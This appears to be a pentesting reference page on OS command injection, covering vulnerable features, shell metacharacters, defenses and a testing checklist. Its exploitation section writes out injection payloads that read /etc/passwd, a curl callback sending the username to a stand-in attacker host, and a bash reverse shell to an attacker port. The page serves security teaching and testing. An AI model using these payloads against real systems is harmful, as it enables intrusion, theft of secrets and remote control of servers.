# Command Injection

Execute OS commands through vulnerable input handlers.

## Overview Diagram

<div class="sr-diagram" markdown="1">

```mermaid
flowchart LR
    IN[; | && payload] --> SHELL[OS shell invoked]
    SHELL --> EXEC[id, cat /etc/passwd]
```

</div>

## How It Works

Command injection executes operating system shell commands when applications invoke system utilities with unsanitized user input—`os.system()`, `exec()`, `subprocess` with `shell=True`, PHP `system()`, Java `Runtime.exec()` with string concatenation.

Vulnerable features:

- Network diagnostics (ping, traceroute, nslookup)
- Image/media conversion (ImageMagick wrappers calling `convert`)
- PDF generators invoking `wkhtmltopdf`
- Git operations, backup scripts, admin "run task" panels

Shell metacharacters break out of intended argument context:

- Unix: `;`, `|`, `&&`, `` ` ``, `$()`, newline
- Windows: `&`, `|`, `^`, `%`

Blind injection uses time delays (`sleep 5`) or out-of-band callbacks (`curl attacker.com`).

## Exploitation

**Detection**

```
; id
| whoami
`id`
$(curl attacker.com/$(whoami))
& ping -c 5 127.0.0.1
```

Observe response output, timing, or DNS/HTTP callbacks.

**Example vulnerable ping**

Input: `8.8.8.8; cat /etc/passwd`

Executed: `ping -c 1 8.8.8.8; cat /etc/passwd`

**Attack flow**

```
User input in shell command string → shell interprets metacharacters → arbitrary OS command → RCE on app server
```

**Tools**

```bash
commix -u "https://target.com/ping?ip=127.0.0.1" --batch
```

**Escalation**

- Reverse shell: `; bash -i >& /dev/tcp/attacker/4444 0>&1`
- Read env/secrets, cloud metadata, pivot internally
- Container breakout if excessive privileges

**Filter bypass**

- Encoding, variable expansion `$({,,)`, alternate commands `[` `]`

## Defense & Mitigation

**Never shell out with user input**

- Use library APIs: DNS resolver libraries instead of `nslookup`, image libs instead of CLI wrappers.

**Argument arrays**

- Python: `subprocess.run(['ping', '-c', '1', ip], shell=False)` with strict IP validation.
- Java: `ProcessBuilder` with separate args, no string shell.

**Validation**

- Allow-list IPs/hostnames matching regex for intended type only.
- Reject shell metacharacters entirely.

**Privilege**

- Run app processes as non-root; containers without CAP_SYS_ADMIN.
- Seccomp/AppArmor profiles blocking `execve` of shells.

**Detection**

- Monitor child process creation from web workers (`/bin/sh`, `cmd.exe`).
- WAF signatures as secondary layer only.

## Methodology

- [ ] Identify ping, traceroute, and file conversion features
- [ ] Test command separators for the target OS
- [ ] Use time delays and out-of-band callbacks
- [ ] Escalate from blind to interactive execution

## Tools

| Tool | Usage |
|------|-------|
| `commix` | [Command injection](../../TOOLS_GUIDE.md#commix) |
| `burp` | [Intercept, repeater & scanner](../../TOOLS_GUIDE.md#burp-suite) |
| `ffuf` | [Web fuzzer](../../TOOLS_GUIDE.md#ffuf) |

## Resources

- [PayloadsAllTheThings Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

## Verification Checklist

- [ ] Review scope and rules of engagement
- [ ] Document baseline behavior
- [ ] Test edge cases and parser differentials
- [ ] Capture proof-of-concept safely
- [ ] Write remediation guidance
